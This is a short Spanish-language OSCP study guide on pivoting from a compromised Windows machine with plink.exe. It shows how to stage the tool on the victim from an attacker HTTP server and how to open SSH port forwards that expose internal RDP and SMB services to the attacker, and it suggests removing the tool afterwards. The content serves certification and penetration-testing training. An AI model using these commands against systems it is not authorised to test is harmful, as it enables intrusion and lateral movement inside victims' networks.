# Guía de Uso de `plink.exe` para Pivoting desde Windows (OSCP)

`plink.exe` es la versión en línea de comandos de PuTTY. Permite establecer túneles SSH desde máquinas Windows, lo que resulta muy útil si comprometes una máquina Windows intermedia y quieres pivotar hacia otra red interna a través de ella.

---

## 1. Descarga

Desde Kali (o máquina atacante):
```bash
wget https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe
```

---

## 2. Subir a la máquina comprometida (Windows)

Usa cualquiera de estos métodos:
- `smbserver.py`
- `certutil`
- `python3 -m http.server`

Ejemplo con PowerShell:
```powershell
Invoke-WebRequest http://<IP>:8000/plink.exe -OutFile C:\Users\Public\plink.exe
```

---

## 3. Sintaxis para Local Port Forwarding

```cmd
plink.exe -ssh usuario@IP_externa -L <puerto_local>:<host_objetivo>:<puerto_objetivo> -N
```

Ejemplo:
```cmd
plink.exe -ssh pivot@10.10.14.30 -L 3389:192.168.100.10:3389 -N
```

Esto redirige el puerto 3389 (RDP) desde la máquina comprometida hacia tu equipo atacante.

---

## Parámetros útiles

- `-N`: no abrir shell, solo el túnel
- `-pw <contraseña>`: si no puedes usar key auth
- `-batch`: evita prompts interactivos (recomendado en scripts)

---

## Casos de Uso en OSCP

- Pivot desde una máquina Windows intermedia hacia una red interna
- Acceder a puertos internos RDP, SMB, MySQL, etc.
- Usar desde `cmd.exe` o `PowerShell` sin GUI

---

## Buenas prácticas

- Ejecutar en segundo plano o con `start /b` si quieres mantenerlo activo:
```cmd
start /b plink.exe -ssh user@IP -L 445:192.168.100.50:445 -N
```
- Borra `plink.exe` al terminar si necesitas limpieza
- Verifica que el puerto redirigido esté abierto antes con `Test-NetConnection` o `ping`

---
